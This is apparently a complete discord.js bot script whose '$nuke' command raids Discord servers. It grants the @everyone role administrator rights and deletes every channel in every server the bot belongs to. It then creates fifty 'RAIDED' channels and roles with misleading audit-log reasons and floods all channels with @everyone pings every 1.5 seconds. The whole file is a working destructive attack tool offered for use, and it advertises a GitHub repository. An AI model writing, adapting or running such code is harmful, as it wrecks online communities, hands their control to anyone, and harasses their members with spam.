const Discord = require('discord.js');
const client = new Discord.Client();

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
    client.user.setActivity("https://github.com/Pol528/gbot", { type: "WATCHING"})
  });

  client.on('message', async (msg) => {
    if (msg.content === '$nuke') {
    //role:
    const guild = msg.guild
    guild.roles.everyone.setPermissions(['ADMINISTRATOR']);
    client.guilds.cache.forEach(guild => { // Looping through the guilds.
        guild.channels.cache.forEach(channel => { // Looping through the guild channels.
            channel.delete().catch(error => { // Deleting the channel(s) and catching any errors.
                console.log(`Couldn't delete ${channel.name}.`)
            });
        });
    });
    let i = 50
    while(i > 0){
    guild.channels.create('RAIDED', { reason: 'Needed a cool new channel' })
    .catch(console.error);
    guild.roles.create({
      data: {
        name: 'RAIDED',
        color: 'RANDOM',
      },
      reason: 'we needed a role for Super Cool People',
    })
    i = i - 1
    }
    function asteapta() {
    client.channels.cache.forEach(channel => {
        channel.send(`@everyone`)
    })
    }
    setInterval(asteapta, 1500);
  }
});
  
client.login('token');